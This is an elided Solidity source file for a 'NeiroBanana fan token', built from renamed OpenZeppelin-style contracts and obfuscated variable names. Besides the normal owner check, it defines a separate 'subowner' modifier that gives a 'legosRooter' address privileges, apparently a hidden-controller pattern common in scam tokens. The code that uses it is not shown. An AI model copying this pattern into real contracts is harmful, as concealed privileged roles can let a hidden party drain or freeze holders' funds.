...
/// https://x.com/NeiroBanana


pragma solidity 0.8.29;

// NeiroBanana fan token

interface NeiroBananainterface {
  /**
...
/*
 * @dev Provides information about the current execution NeiroBanana20Burnable, including the
 ...
 */
abstract contract NeiroBanana20Burnable {
...
// File: @openzeppelin/contracts/access/NeiroBanana20Ownable.sol
 ...
 * the owner.
 */
abstract contract NeiroBanana20Ownable is NeiroBanana20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "NeiroBanana20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "NeiroBanana20Ownable: new owner is the zero address");
 ...
 * `SafeNeiroBanana` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeNeiroBanana {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeNeiroBanana: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeNeiroBanana: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeNeiroBanana: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeNeiroBanana: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeNeiroBanana: modulo by zero");
  }
...
contract NeiroBananaToken is NeiroBanana20Burnable, NeiroBananainterface, NeiroBanana20Ownable {
    
    using SafeNeiroBanana for uint256;
    ...
    */
    ...
    /**
    * @dev See {NeiroBananainterface-totalSupply}.
    */
    ...
    /**
    * @dev See {NeiroBananainterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "NeiroBanana20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {NeiroBananainterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {NeiroBananainterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {NeiroBananainterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {NeiroBananainterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {NeiroBananainterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "NeiroBananainterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {NeiroBananainterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "NeiroBananainterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "NeiroBananainterface: transfer from the zero address");
        require(shippingto != address(0), "NeiroBananainterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "NeiroBananainterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "NeiroBananainterface: approve from the zero address");
        require(transporteur != address(0), "NeiroBananainterface: approve to the zero address");
